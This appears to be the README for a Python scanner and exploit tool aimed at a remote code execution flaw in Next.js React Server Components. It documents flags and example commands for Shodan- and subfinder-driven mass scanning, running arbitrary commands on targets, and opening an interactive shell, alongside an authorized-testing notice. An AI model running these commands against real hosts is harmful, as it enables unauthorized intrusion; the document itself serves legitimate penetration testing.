# Torito React2Shell Scanner & Exploit Tool (CVE-2025-55182 / 66478)
<p align="center">
  <img width="609" height="250" alt="Torito Logo" src="https://torito.io/torito.svg">
</p>
Detection-first scanner for Next.js RSC targets with optional PoC confirm and exploit/shell modes. Use only on systems you are authorized to test.

## Requirements
- Python 3.9+
- `pip install -r requirements.txt`
 - Subfinder binary in `PATH` for `--subfinder` (install via Homebrew `brew install subfinder` or Go: `go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest`; project: https://github.com/projectdiscovery/subfinder)
- Shodan usage requires `pip install shodan` (already in requirements) **and** a key: `export SHODAN_API_KEY=...` with available query credits

## Usage
```bash
python3 torito_r2s.py --help
```

## Flags
| Flag | Description | Default |
| ---- | ----------- | ------- |
| `-u, --url URL` | Single target URL | — |
| `-l, --list FILE` | File with targets (one per line) | — |
| `--subfinder DOMAIN` | Run subfinder for domain and add results | — |
| `--shodan QUERY` | Shodan search (needs `SHODAN_API_KEY` with credits) | — |
| `--shodan-limit N` | Max Shodan results per query | `100` |
| `-t, --threads N` | Concurrency | `20` |
| `--timeout SEC` | Request timeout | `10` |
| `--proxy URL` | HTTP/HTTPS proxy | — |
| `--confirm` | Run redirect-based PoC after probe | off |
| `--exploit-cmd "CMD"` | Run RCE payload with command | — |
| `--shell, -i` | Open interactive shell on first exploit success (defaults cmd to `id`) | off |
| `--json-out FILE` | Save JSON results | — |
| `--csv-out FILE` | Save CSV results | — |
| `-v, --verbose` | Show decoded outputs/digests in table | off |

## Examples
Safe probe (single target)
```bash
python3 torito_r2s.py -u https://target.com
```

PoC confirm (side-channel redirect)
```bash
python3 torito_r2s.py -u https://target.com --confirm
```

Exploit with custom command
```bash
python3 torito_r2s.py -u https://target.com --exploit-cmd "whoami"
```

Interactive shell on first hit
```bash
python3 torito_r2s.py -u https://target.com --shell
```

List scan with exports
```bash
python3 torito_r2s.py -l hosts.txt -t 40 --confirm --json-out results.json --csv-out results.csv
```

Shodan-only (needs key and credits)
```bash
export SHODAN_API_KEY=your_key
python3 torito_r2s.py --shodan 'http.title:"Next.js"' --shodan-limit 50 --confirm
```

Subfinder-only
```bash
python3 torito_r2s.py --subfinder target.com --confirm
```

Proxy (Burp/Caido)
```bash
python3 torito_r2s.py -u https://target.com --proxy http://127.0.0.1:8080 --confirm
```

Pipeline via stdin
```bash
cat urls.txt | python3 torito_r2s.py --confirm
```

## Output notes
- Table shows fingerprint (NX/AR), probe, confirm, exploit.
- Exploit digests are base64-decoded when possible; verbose mode shows previews.
- JSON/CSV include raw digest and decoded output (if any).

## Safety
- For authorized testing only.
- Default run is non-destructive probe; exploit executes only with `--exploit-cmd` or `--shell`.
